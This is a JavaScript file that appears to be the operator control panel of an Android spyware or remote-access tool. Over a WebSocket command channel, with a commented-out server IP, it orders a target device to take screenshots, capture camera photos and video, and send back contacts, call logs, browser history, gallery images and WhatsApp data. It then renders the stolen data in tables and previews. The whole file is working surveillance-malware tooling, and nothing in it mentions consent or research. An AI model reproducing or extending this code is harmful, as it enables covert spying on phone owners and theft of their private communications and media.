var mp = new Map();

// var conn = new WebSocket('ws://43.228.237.131:8080');
  var conn = new WebSocket('ws://localhost:8080');
  conn.onopen = function(e) {
      console.log("Connection established!");
  };

  function screenshot(id){
    var msg={};
    msg.device=id;
    msg.cmd="screenshot";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
    conn.send(msg);
  }

  function whatsapp(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="whatsapp";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
    conn.send(msg);
  }

  function browserhistory(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="browserhistory";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
    conn.send(msg);
  }
  function camera(x){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="camera";
    msg.cam=x;
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function video(x,fr){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="video";
    msg.cam=x;
    msg.frames=frames;
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function contacts(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="contacts";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function gallery(){
    $("*").css("cursor", "wait");
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="gallery";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      var progbar=' <div class="progress"> <div class="progress-bar" id="gallery_proggress_bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width:0%"></div></div>';
      $("#gallery_fetch").html(progbar);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }
  function callLog(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="calllog";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
    $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function build_contacts_table(name){
    $.getJSON("../data/"+name,function(data){
      var htmlString='<table id="contacts_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Name</th><th>Number(s)</th></tr></thead><tbody>';
      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var numbs=data[i].phones;
        numbs = numbs.substr(1,numbs.length-2);
        row+="<td>"+data[i].id+"</td><td>"+data[i].name+"</td><td>"+numbs+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody></table>";
      $("#contacts_fetch").html(htmlString);
      $("#contacts_fetch_table").DataTable();
      $("*").css("cursor", "default");
    });
  }


  function build_browserhistory(name){
    $.getJSON("../data/"+name,function(data){
      var htmlString='<table id="browserhistory_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>ID</th><th>Site</th><th>Time</th><th>Visits</th></tr></thead><tbody>';
      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var time=new Date(parseInt(data[i].time));
        if(parseInt(data[i].time)<0)
          time="--";
        else time = "<p hidden>"+time.getTime()+"</p>"+time.toLocaleString();
        row+="<td>"+data[i].id+"</td><td><a target=newtab href=\""+data[i].url+"\">"+data[i].title+"</a></td><td>"+time+"</td><td>"+data[i].visits+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody></table>";
      $("#browserhistory_fetch").html(htmlString);
      $("#browserhistory_fetch_table").DataTable();
      $("*").css("cursor", "default");
    });
  }
  function build_call_log_table(name){
    $.getJSON("../data/"+name,function(data){
      var htmlString='<table id="calllog_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Name</th><th>Number</th><th>Time</th><th>Duration</th><th>Type</th></tr></thead><tbody>';

      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var d=new Date(data[i].datetime);
        var ct="";
        switch(data[i].type){
          case "O":ct='<i class="material-icons text text-primary" >call_made</i>';
          break;
          case "M":ct='<i class="material-icons text text-danger">call_missed</i>';
          break;
          default:ct='<i class="material-icons text text-success">call_received</i>';
        }
        var time=get_elapsed_time(data[i].duration);
        time= time.substr(0,time.length-4);
        row+="<td>"+data[i].name+"</td><td>"+data[i].number+"</td><td><p hidden>"+d.getTime()+"</p>"+d.toLocaleString()+"</td><td>"+time+"</td><td>"+ct+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody></table>";
      $("#calllog_fetch").html(htmlString);
      $("#calllog_fetch_table").DataTable({
        "order": [[ 2, "desc" ]]
    } );
      $("*").css("cursor", "default");
    });
  }

  function preview_base64(img){
    img="data:image/jpg;base64,"+img;
    $("#preview_image").attr("src",img);
  }
  function gallery_preview(x){
    var img=$(x).attr("data-image");
    preview_base64(img);
  }

  function gallery_fetch(th){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="fetch";
    msg.path=$(th).attr("data-path");
    msg.item=$(th).attr("data-id");
    mp.set(msg.item,th);
    console.log(msg);
    msg=JSON.stringify(msg);
    conn.send(msg);

  }

  function glorify(id,img){
    var obj=mp.get(id);
    $(obj).removeClass("btn-warning");
    $(obj).addClass("btn-primary");
    $(obj).attr("data-img",img);
    $(obj).attr("onclick","gallery_preview(this)");
    $(obj).html("Preview");
  }

  function build_gallery_fetcher(){
    console.log("Gallery Data Requested");
    $.getJSON("../db/get_gallery.php?device_id="+active_device.device_id,function(data){
      console.log("Gallery Data Received");
      var htmlString='<table id="gallery_fetch_table" class="table table-striped table-bordered bulk_action"><thead><tr><th>Folder</th><th>Path</th><th>Cache</th></thead><tbody>';
      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var ct="";
        if(data[i].cached=="0"){
          ct='<button type="button" onclick="gallery_fetch(this)" class="btn btn-warning btn-sm" data-path="'+data[i].path+'" data-id="'+data[i].id+'">Fetch</button>';
        }else{
          ct='<button type="button" onclick="gallery_preview(this)" class="btn btn-primary btn-sm" data-image="'+data[i].cached+'">Preview</button>'
        }
        row+="<td>"+data[i].folder+"</td><td>"+data[i].path+"</td><td>"+ct+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody></table>";
      $("#gallery_fetch").html(htmlString);
      $("#gallery_fetch_table").DataTable();
      $("*").css("cursor", "default");
    });
  }

  conn.onmessage = function(e) {
    var msg=JSON.parse(e.data);
    console.log(msg);
    switch(msg.type){
      case "calllog":
      build_call_log_table(msg.list);
      break;
      case "contacts":
      build_contacts_table(msg.list);
      break;
      case "browserhistory":
      build_browserhistory(msg.list);
      break;
      case "gallery_progress":
      $("#gallery_proggress_bar").css("width",Math.ceil((msg.done*100)/msg.total)+"%");
      if(msg.done == msg.total){
        setTimeout(function(){
          $("#gallery_proggress_bar").parent().slideUp();
          build_gallery_fetcher();
        },3000);
      }
      break;
      case "fetch":
      preview_base64(msg.response);
      console.log(msg.response.length);
      glorify(msg.item,msg.response);
      break;
      case "camera":
      preview_base64(msg.response);
      $("*").css("cursor", "default");
      if(frames>=1){
        $("#frame-slider").data("ionRangeSlider").update({from:frames});
        frames-=1;
      }
      break;
      case "response_error":
      alert("Error : "+msg.message);
      $("*").css("cursor", "default");
      break;
      case "error_reporting":alert(msg.msg);
      $("*").css("cursor", "default");
      break;
    }
  }
